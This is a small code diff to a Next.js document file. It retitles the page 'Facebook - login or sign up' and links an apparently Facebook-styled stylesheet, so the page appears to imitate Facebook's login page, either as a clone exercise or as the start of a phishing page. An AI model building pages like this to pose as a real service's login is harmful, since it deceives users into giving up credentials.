@@ -3,7 +3,7 @@ import { Html, Head, Main, NextScript } from "next/document";
 export default function Document() {
   return (
     <Html lang="en">
-      <title>Why u Do this</title>
+      <title>Facebook - login or sign up </title>
       <link href="./fb.ss"></link>
       <Head />
       <body>
